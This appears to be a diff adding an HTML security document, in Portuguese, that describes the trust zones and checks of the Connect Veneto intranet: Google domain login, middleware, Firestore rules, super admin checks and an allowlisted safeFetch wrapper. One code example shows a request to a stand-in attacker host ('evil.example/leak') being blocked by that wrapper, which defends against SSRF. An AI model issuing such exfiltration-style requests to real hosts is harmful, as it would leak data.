@@ -1,0 +1,377 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<title>Connect Veneto - Trust Boundaries</title>
+<style>
+  :root {
+    --navy: #0d1d2c; --navy-2: #162a3f; --blue: #2d58a5; --gold: #e1ca5f;
+    --gray: #a9a9a8; --bg: #f5f7fa; --ok: #1d8c4a; --warn: #b07b00; --crit: #a12321;
+  }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); margin: 0; color: #1a1a1a; line-height: 1.55; }
+  header { background: var(--navy); color: #fff; padding: 24px 32px; }
+  header h1 { margin: 0; font-size: 22px; }
+  header .sub { color: var(--gold); font-size: 13px; margin-top: 4px; }
+  nav { background: var(--navy-2); color: #fff; padding: 10px 32px; display: flex; gap: 16px; font-size: 14px; }
+  nav a { color: #fff; text-decoration: none; padding: 4px 8px; border-radius: 4px; }
+  nav a:hover { background: var(--blue); }
+  main { padding: 32px; max-width: 1100px; margin: 0 auto; }
+  h2 { color: var(--navy); border-bottom: 2px solid var(--gold); padding-bottom: 6px; margin-top: 36px; }
+  h3 { color: var(--navy); margin-top: 22px; }
+  .lead { background: #fff; border-left: 4px solid var(--blue); padding: 14px 18px; border-radius: 6px; margin-bottom: 20px; }
+  .zone { background: #fff; border: 1px solid #e1e5ea; border-radius: 8px; padding: 16px 20px; margin: 10px 0 16px; display: flex; gap: 18px; align-items: flex-start; }
+  .zone .num { flex: 0 0 58px; height: 58px; border-radius: 50%; background: var(--navy); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 22px; }
+  .zone.z0 .num { background: var(--gray); }
+  .zone.z1 .num { background: #7a8ea0; }
+  .zone.z2 .num { background: var(--gold); color: var(--navy); }
+  .zone.z3 .num { background: var(--blue); }
+  .zone.z4 .num { background: #1c6f3c; }
+  .zone.z5 .num { background: #6c3baa; }
+  .zone h4 { margin: 0 0 6px; color: var(--navy); font-size: 16px; }
+  .zone .tag { font-size: 11px; color: var(--gray); text-transform: uppercase; letter-spacing: .5px; }
+  .cross { background: #fff; border-radius: 8px; padding: 14px 18px; margin: 14px 0; border-left: 6px solid var(--blue); }
+  .cross h4 { margin: 0 0 8px; color: var(--navy); font-size: 15px; }
+  .cross ol { margin: 6px 0 6px 18px; padding-left: 6px; }
+  .cross li { margin-bottom: 4px; }
+  .who { background: #eef4ff; color: var(--navy); font-weight: 600; padding: 6px 10px; border-radius: 6px; font-size: 13px; display: inline-block; margin-top: 4px; }
+  code { background: #f2f4f7; padding: 1px 4px; border-radius: 3px; font-size: 12.5px; }
+  .flow { background: #fff; padding: 18px; border: 1px solid #e1e5ea; border-radius: 8px; font-family: 'Consolas','Menlo',monospace; font-size: 12.5px; white-space: pre; overflow-x: auto; color: #1a1a1a; }
+  table { width: 100%; border-collapse: collapse; font-size: 13.5px; margin-top: 8px; background: #fff; }
+  th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid #e1e5ea; vertical-align: top; }
+  th { background: #fafbfc; color: var(--navy); }
+  .pill { display: inline-block; padding: 1px 8px; border-radius: 10px; font-size: 11px; font-weight: 700; color: #fff; }
+  .pill-ok { background: var(--ok); }
+  .pill-warn { background: var(--warn); }
+  .pill-crit { background: var(--crit); }
+  footer { text-align: center; font-size: 12px; color: var(--gray); padding: 20px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>Trust Boundaries - Connect Veneto</h1>
+  <div class="sub">Narrativa passo a passo: quem voce e em cada momento e quem fiscaliza cada travessia</div>
+</header>
+<nav>
+  <a href="overview.html">Overview</a>
+  <a href="trust-boundaries.html">Trust Boundaries</a>
+  <a href="apis.html">APIs</a>
+  <a href="findings.html">Findings</a>
+  <a href="supply-chain.html">Supply Chain</a>
+</nav>
+<main>
+
+  <div class="lead">
+    <strong>Trust boundary</strong> (fronteira de confianca) e o ponto onde a identidade e a permissao do solicitante <strong>mudam</strong>.
+    Toda requisicao comeca na zona de <em>menor confianca</em> (Zona 0 - publico anonimo) e, para chegar a qualquer dado
+    sensivel, precisa <strong>passar por travessias</strong>. Cada travessia tem um fiscal (codigo ou regra) que decide se voce
+    sobe de nivel.
+  </div>
+
+  <h2>As 6 zonas</h2>
+
+  <div class="zone z0">
+    <div class="num">0</div>
+    <div>
+      <div class="tag">Zona 0</div>
+      <h4>Publico anonimo</h4>
+      <p>Qualquer pessoa do mundo chegando na URL sem ter feito login. <strong>Nao apresentou credencial nenhuma.</strong>
+      O servidor nao sabe quem e essa pessoa: pode ser um colaborador legitimo, um colega da pessoa, um bot, um atacante.</p>
+      <p>O que ela pode ver:</p>
+      <ul>
+        <li>A tela de <code>/login</code> (precisa ser publica, senao ninguem loga).</li>
+        <li>O documento <code>systemSettings/public_config</code>, que por contrato contem apenas <code>maintenanceMode</code> e <code>maintenanceMessage</code>. Esta aberto para mostrar a mensagem de manutencao antes do login.</li>
+        <li>Arquivos estaticos (imagens, favicon).</li>
+      </ul>
+      <p><strong>Por que se chama anonimo:</strong> nao e que o usuario seja mal-intencionado; e que ninguem ainda provou quem e. Default para todo mundo que chega.</p>
+    </div>
+  </div>
+
+  <div class="zone z1">
+    <div class="num">1</div>
+    <div>
+      <div class="tag">Zona 1</div>
+      <h4>Autenticado corporativo</h4>
+      <p>Usuario fez login via Google com conta <code>@venetomfo.com.br</code> e o Firebase Auth aceitou. Agora o server sabe o <code>uid</code> e o <code>email</code> (verificados pelo Google).</p>
+      <p>O que ele pode fazer:</p>
+      <ul>
+        <li>Ler colecoes do Firestore marcadas como <code>isAuthenticated()</code> nas rules (colaboradores, mural, documentos...).</li>
+        <li>Chamar rotas <code>/api/*</code> protegidas por <code>requireCorporateUser</code>.</li>
+      </ul>
+      <p>Ainda <strong>nao sabemos</strong> se ele e super admin, e <strong>nao validamos</strong> que ele esta cadastrado na base de colaboradores (isso acontece logo depois, no <code>AuthContext</code>).</p>
+    </div>
+  </div>
+
+  <div class="zone z2">
+    <div class="num">2</div>
+    <div>
+      <div class="tag">Zona 2</div>
+      <h4>Super admin</h4>
+      <p>Um subconjunto pequeno da Zona 1. E uma pessoa da Zona 1 cujo email consta em <code>systemSettings/config.superAdminEmails</code> (ou em <code>admin_config</code> quando a migracao do Bloco 7 concluir).</p>
+      <p>Privilegios:</p>
+      <ul>
+        <li>Escrever em <code>systemSettings</code>, gerenciar colaboradores em lote, trocar modo de manutencao.</li>
+        <li>Acessar <code>/api/billing</code>, <code>/api/admin/settings</code>.</li>
+        <li>Bypass do modo manutencao (pode entrar mesmo com plataforma "fechada").</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="zone z3">
+    <div class="num">3</div>
+    <div>
+      <div class="tag">Zona 3</div>
+      <h4>Server Next.js</h4>
+      <p>Este nao e um usuario; e o <strong>processo do lado da Vercel</strong> executando o codigo das rotas <code>/api/*</code>. Ele carrega <code>FIREBASE_ADMIN_*</code> do env, o que significa que roda com poderes de administrador no Firebase.</p>
+      <p>Por isso so codigo confiavel roda aqui. Toda chamada externa feita a partir desta zona precisa passar pelo <code>safeFetch</code>.</p>
+
+      <div style="background: #eef4ff; border: 1px dashed var(--blue); border-radius: 6px; padding: 12px 14px; margin-top: 14px;">
+        <h5 style="margin: 0 0 8px; color: var(--navy); font-size: 14px;">O que e <code>safeFetch</code>?</h5>
+        <p style="margin: 0 0 8px; font-size: 13.5px;">
+          E uma funcao propria do projeto (<code>src/lib/security/http.ts</code>) que substitui o <code>fetch</code> normal sempre que o server precisa
+          falar com um sistema externo (Google, BrasilAPI, InfoMoney). Antes de fazer a requisicao, ela aplica quatro protecoes:
+        </p>
+        <ul style="margin: 0 0 8px; padding-left: 20px; font-size: 13.5px;">
+          <li><strong>Allowlist de host:</strong> o chamador passa uma lista de hosts permitidos (ex: <code>['www.googleapis.com']</code>). Qualquer outra URL e rejeitada imediatamente com <code>OutboundHttpError 403</code>, sem nem tentar a conexao.</li>
+          <li><strong>Timeout:</strong> a requisicao e abortada depois de um limite configurado (ex: 5 segundos). Isso impede o server de ficar pendurado esperando um upstream lento.</li>
+          <li><strong>Erros uniformes:</strong> se falhar, devolve sempre um <code>OutboundHttpError</code> (nao uma stack trace qualquer do <code>fetch</code>). Facilita log e resposta ao cliente.</li>
+          <li><strong>Metodo controlado:</strong> por padrao, so deixa <code>GET</code>. Evita acidente de escrita em servico externo.</li>
+        </ul>
+        <p style="margin: 0 0 8px; font-size: 13.5px;"><strong>Por que importa?</strong> Sem <code>safeFetch</code>, um bug ou vulnerabilidade poderia levar o server a requisitar qualquer URL que um atacante quisesse - padrao classico de <em>SSRF</em> (Server-Side Request Forgery). Com allowlist, o ataque morre antes de sair da maquina.</p>
+        <p style="margin: 0; font-size: 13.5px;"><strong>Exemplo pratico:</strong></p>
+        <pre style="background: #0d1d2c; color: #e1f4e8; padding: 10px; border-radius: 4px; margin: 6px 0 0; font-size: 12px; overflow-x: auto;">// OK - host na allowlist
+const r = await safeFetch('https://www.googleapis.com/calendar/v3/...', {
+  allowedHosts: ['www.googleapis.com'],
+  timeoutMs: 5000,
+});
+
+// BLOQUEADO - nem tenta conectar
+await safeFetch('https://evil.example/leak', {
+  allowedHosts: ['www.googleapis.com'],
+});
+// Throws: OutboundHttpError "Destino externo nao permitido." status 403</pre>
+        <p style="margin: 8px 0 0; font-size: 12.5px; color: var(--gray);">Convencao do projeto: <strong>nenhuma</strong> rota em <code>src/app/api/*/route.ts</code> pode usar <code>fetch</code> cru para host externo. Tem que passar por <code>safeFetch</code>.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="zone z4">
+    <div class="num">4</div>
+    <div>
+      <div class="tag">Zona 4</div>
+      <h4>Firebase / Firestore</h4>
+      <p>O banco e os servicos do Firebase. Quem decide o que pode ser lido/escrito e o arquivo <code>firestore.rules</code>. Essa e a <strong>autoridade final</strong> para acessos feitos via SDK client-side.</p>
+      <p>Quando o server-side usa Admin SDK, as regras sao <strong>ignoradas</strong> (poder total). E por isso que a chave Admin precisa ficar guardada.</p>
+    </div>
+  </div>
+
+  <div class="zone z5">
+    <div class="num">5</div>
+    <div>
+      <div class="tag">Zona 5</div>
+      <h4>Servicos externos</h4>
+      <p>Google Calendar API, BrasilAPI (feriados), InfoMoney RSS. Sao sistemas fora do controle da Vêneto. Toda conversa com eles passa por <code>safeFetch</code> com allowlist.</p>
+    </div>
+  </div>
+
+  <h2>Travessias - passo a passo</h2>
+
+  <p>Abaixo, a sequencia completa do que acontece quando um usuario entra na plataforma e faz uma acao. Cada seta e uma travessia entre zonas, com seu fiscal proprio.</p>
+
+  <div class="cross">
+    <h4>Travessia 0 -> 1: login Google</h4>
+    <ol>
+      <li>Usuario abre <code>/login</code> (ainda na Zona 0).</li>
+      <li>Clica em "Entrar com Google". O componente <code>src/app/(auth)/login/page.tsx</code> chama <code>signInWithGoogle()</code> do <code>AuthContext</code>.</li>
+      <li>Firebase abre o popup do Google, que exige <code>hd: venetomfo.com.br</code> (hosted domain). Google nao deixa outras contas sequer aparecerem.</li>
+      <li>Se o usuario autorizar, o Google emite um <strong>ID token</strong> JWT assinado.</li>
+      <li>O Firebase Auth valida a assinatura e cria sessao local.</li>
+      <li>O <code>AuthContext</code> ainda confere <code>isCorporateEmail(email)</code>. Se o email nao termina com <code>@venetomfo.com.br</code>, faz <code>signOut</code> imediato.</li>
+      <li>Passou? Um cookie <code>cv_auth=1</code> e gravado (24h, SameSite=Lax). A sessao existe.</li>
+    </ol>
+    <div class="who">Fiscal: Google (hd) + Firebase Auth (assinatura) + <code>isCorporateEmail</code> (dominio) + <code>AuthContext</code> (fallback)</div>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 1 -> bloqueio por manutencao (opcional)</h4>
+    <ol>
+      <li><code>AuthContext</code> chama <code>/api/me/session</code> passando o ID token no header <code>Authorization: Bearer</code>.</li>
+      <li>Server-side, <code>requireCorporateUser</code> verifica o token com Admin SDK e descobre o <code>email</code>.</li>
+      <li>O server le <code>systemSettings/admin_config</code> (ou fallback <code>config</code>) e decide se a pessoa e super admin. Retorna <code>{ isSuperAdmin, maintenanceMode, maintenanceMessage, allowedUserIds }</code>.</li>
+      <li>Se <code>maintenanceMode=true</code> e o usuario nao e super admin nem esta em <code>allowedUserIds</code>, o <code>AuthContext</code> faz <code>signOut</code> com toast "Manutencao".</li>
+    </ol>
+    <div class="who">Fiscal: <code>/api/me/session</code> + <code>AuthContext</code></div>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 1 -> navegacao protegida (middleware)</h4>
+    <ol>
+      <li>Usuario clica em <code>/dashboard</code> (ou qualquer rota protegida).</li>
+      <li>O <code>middleware.ts</code> (rodando na borda da Vercel, antes de qualquer pagina) intercepta a request.</li>
+      <li>Confere o cookie <code>cv_auth</code>. Se nao existir, <strong>redireciona</strong> para <code>/login?next=/dashboard</code>.</li>
+      <li>Se existir, passa. A pagina comeca a renderizar.</li>
+    </ol>
+    <div class="who">Fiscal: <code>middleware.ts</code> + cookie <code>cv_auth</code></div>
+    <p style="font-size:13px;color:#666;margin:8px 0 0;"><strong>Nota:</strong> middleware e <em>UX</em>. Ele so decide se a pagina abre ou nao. A autorizacao real de dado continua nas proximas travessias.</p>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 1 -> 4: leitura direta do Firestore (via SDK client)</h4>
+    <ol>
+      <li>A pagina (ex: dashboard, colaboradores) usa o SDK do Firebase Web para fazer <code>getDoc</code> / <code>getDocs</code>.</li>
+      <li>O SDK envia a requisicao com o ID token do usuario.</li>
+      <li>O Firestore executa as regras de <code>firestore.rules</code>. Se a regra for <code>allow read: if isAuthenticated()</code>, permite. Se for <code>isSuperAdmin()</code>, so super admin passa. Se nao tem regra permissiva, devolve <code>permission-denied</code>.</li>
+    </ol>
+    <div class="who">Fiscal: <code>firestore.rules</code></div>
+    <p style="font-size:13px;color:#666;margin:8px 0 0;">E por isso que <code>firestore.rules</code> e o documento mais critico do projeto: e a unica autoridade quando o client fala com o banco diretamente.</p>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 1 -> 3 -> 4: chamada a uma rota <code>/api/*</code></h4>
+    <ol>
+      <li>Client chama, por exemplo, <code>/api/calendar?timeMin=...&timeMax=...</code> com <code>Authorization: Bearer &lt;ID token&gt;</code>.</li>
+      <li>A rota em <code>src/app/api/calendar/route.ts</code> chama <code>requireCorporateUser</code>. Se token invalido ou fora do dominio corporativo, responde <code>401/403</code>.</li>
+      <li>Zod valida os parametros (<code>timeMin</code>, <code>timeMax</code>). Falha -> <code>400</code>.</li>
+      <li>A rota chama <code>safeFetch</code> para <code>www.googleapis.com</code>. Outros hosts sao bloqueados com <code>403</code>.</li>
+      <li>Se o upstream falha ou excede o limite, devolve <code>502</code> uniforme.</li>
+      <li>Se tudo ok, retorna JSON limpo com <code>items</code>.</li>
+    </ol>
+    <div class="who">Fiscal: <code>requireCorporateUser</code> + <code>validateSearchParams</code> + <code>safeFetch</code> + <code>logSecurityEvent</code></div>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 1 -> 2 -> 3: acao de super admin</h4>
+    <ol>
+      <li>Usuario acessa <code>/api/billing</code> (ou <code>/api/admin/settings</code>).</li>
+      <li>A rota chama <code>requireSuperAdmin</code>, que:
+        <ul>
+          <li>Primeiro valida o token (<code>requireCorporateUser</code>).</li>
+          <li>Depois le <code>systemSettings/config.superAdminEmails</code> via Admin SDK e confere se o email esta la.</li>
+        </ul>
+      </li>
+      <li>Se nao estiver, responde <code>403 FORBIDDEN_SUPER_ADMIN_REQUIRED</code>.</li>
+      <li>Se estiver, executa a operacao sensivel e loga via <code>logSecurityEvent</code>.</li>
+    </ol>
+    <div class="who">Fiscal: <code>requireSuperAdmin</code> = <code>requireCorporateUser</code> + checagem de lista no server</div>
+  </div>
+
+  <div class="cross">
+    <h4>Travessia 3 -> 5: chamada a servico externo</h4>
+    <ol>
+      <li>A rota quer conversar com um sistema fora (Calendar, BrasilAPI, InfoMoney).</li>
+      <li>Obriga-se a usar <code>safeFetch(url, { allowedHosts, timeoutMs })</code>.</li>
+      <li>Se a URL nao esta na allowlist -> <code>OutboundHttpError 403</code>. A request nem sai.</li>
+      <li>Se sair e passar do <code>timeoutMs</code> -> <code>504</code>.</li>
+      <li>Em caso de <code>/api/rss</code> tambem checa <code>content-type</code> e limita body a 2 MB.</li>
+    </ol>
+    <div class="who">Fiscal: <code>safeFetch</code> + allowlist por rota</div>
+  </div>
+
+  <h2>Diagrama textual completo</h2>
+  <div class="flow">
+[Zona 0 - Publico]
+    |
+    | 1. clica "Entrar com Google"
+    v
+[Google OIDC (hd=venetomfo.com.br)]
+    |
+    | 2. ID token assinado
+    v
+[Firebase Auth + isCorporateEmail] --- rejeita se nao-corporativo ---> [Zona 0 (logout)]
+    |
+    | 3. sessao criada + cookie cv_auth
+    v
+[Zona 1 - Autenticado corporativo] --- navegacao ---> [middleware.ts] --- ok ---> renderiza pagina
+    |
+    | 4. /api/me/session com Bearer token
+    v
+[Server Next.js - Zona 3]
+    | requireCorporateUser (valida token)
+    | le admin_config/config via Admin SDK
+    v
+retorna { isSuperAdmin, maintenanceMode, ... }
+    |
+    +--- se super admin ---> [Zona 2]
+    |
+    +--- se comum ---> segue em [Zona 1]
+
+Operacoes de dado:
+  [Zona 1] --SDK Web-->  [firestore.rules]  -->  [Zona 4 Firestore]
+  [Zona 1] --/api/*-->  [requireCorporateUser] -->  [Zona 3]  -->  Admin SDK  -->  [Zona 4]
+  [Zona 2] --/api/billing, /api/admin/settings -->  [requireSuperAdmin] --> idem
+
+Chamadas externas:
+  [Zona 3] --safeFetch + allowlist--> [Zona 5 servicos externos]
+  </div>
+
+  <h2>Tabela resumo dos fiscais</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Travessia</th><th>O que esta sendo provado</th><th>Fiscal</th><th>Onde</th><th>Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>0 -> 1 (login)</td>
+        <td>Email valido e do dominio corporativo</td>
+        <td>Google + Firebase Auth + <code>isCorporateEmail</code></td>
+        <td>src/contexts/AuthContext.tsx, src/lib/api-auth.ts</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+      <tr>
+        <td>1 -> manutencao</td>
+        <td>Usuario pode passar mesmo com <code>maintenanceMode</code>?</td>
+        <td><code>/api/me/session</code> (Bloco 7 Phase A)</td>
+        <td>src/app/api/me/session/route.ts</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+      <tr>
+        <td>1 -> pagina protegida</td>
+        <td>Sessao ativa</td>
+        <td>Cookie <code>cv_auth</code> + middleware</td>
+        <td>middleware.ts</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+      <tr>
+        <td>1 -> 4 (SDK)</td>
+        <td>Regra de colecao permite o acesso</td>
+        <td><code>firestore.rules</code></td>
+        <td>firestore.rules</td>
+        <td><span class="pill pill-warn">Parcial (ver FIRESTORE_RULES_DIFF.md)</span></td>
+      </tr>
+      <tr>
+        <td>1 -> 3 (/api/*)</td>
+        <td>Token valido + input valido + host permitido</td>
+        <td><code>requireCorporateUser</code> + Zod + <code>safeFetch</code></td>
+        <td>src/lib/security/*</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+      <tr>
+        <td>1 -> 2</td>
+        <td>Email esta em <code>superAdminEmails</code></td>
+        <td><code>requireSuperAdmin</code></td>
+        <td>src/lib/security/auth.ts</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+      <tr>
+        <td>3 -> 5</td>
+        <td>Host na allowlist e dentro do timeout</td>
+        <td><code>safeFetch</code></td>
+        <td>src/lib/security/http.ts</td>
+        <td><span class="pill pill-ok">OK</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Conclusao pratica</h2>
+  <ul>
+    <li><strong>Zona 0 e publica por necessidade</strong>, nao por descuido. Se voce nao pode fechar <code>/login</code>, nao consegue deixar ninguem entrar.</li>
+    <li><strong>A travessia 0 -> 1 e a mais sensivel</strong>, e por isso tem tres camadas de fiscal em serie (Google, Firebase, isCorporateEmail).</li>
+    <li><strong>O middleware e defesa fraca (UX).</strong> Protecao de dado real esta nas travessias 1 -> 4 (<code>firestore.rules</code>) e 1 -> 3 (<code>requireCorporateUser</code>).</li>
+    <li><strong>Zona 2 (super admin) existe server-side</strong>, nao e atributo do usuario. E recalculada a cada request via <code>requireSuperAdmin</code>.</li>
+    <li><strong>Zona 5 e sempre tratada como hostil.</strong> Mesmo Google e BrasilAPI passam por <code>safeFetch</code>.</li>
+  </ul>
+</main>
+<footer>Connect Veneto - trust boundaries</footer>
+</body>
+</html>
